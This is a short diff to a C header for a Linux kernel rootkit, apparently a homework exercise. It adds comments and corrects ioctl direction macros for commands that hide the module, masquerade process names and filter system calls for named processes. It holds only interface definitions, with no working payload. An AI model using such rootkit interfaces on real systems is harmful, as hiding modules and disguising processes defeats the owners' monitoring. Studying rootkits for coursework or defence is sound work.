@@ -3,8 +3,8 @@
 
 #include <linux/string.h>
 
-#define MASQ_LEN 0x20
-#define TASK_FILTER_LEN 0x20
+#define MASQ_LEN 0x20 // max length for masquerade proc name
+#define TASK_FILTER_LEN 0x20 // max length for filter proc name
 
 
 struct masq_proc {
@@ -17,15 +17,15 @@ struct masq_proc_req {
     struct masq_proc *list;
 };
 
-struct filter_info {
-    int syscall_nr;
-    char comm[TASK_FILTER_LEN];
+struct filter_info {  
+    int syscall_nr; // syscall number
+    char comm[TASK_FILTER_LEN]; // process to be blocked
 };
 
 #define MAGIC 'k'
 #define IOCTL_MOD_HIDE _IO(MAGIC, 0)
 #define IOCTL_MOD_MASQ _IOW(MAGIC, 1, struct masq_proc_req)
-#define IOCTL_ADD_FILTER _IOR(MAGIC, 2, struct filter_info)
-#define IOCTL_REMOVE_FILTER _IOR(MAGIC, 3, struct filter_info)
+#define IOCTL_ADD_FILTER _IOW(MAGIC, 2, struct filter_info)
+#define IOCTL_REMOVE_FILTER _IOW(MAGIC, 3, struct filter_info)
 
 #endif /* __ROOTKIT_HW2_H */
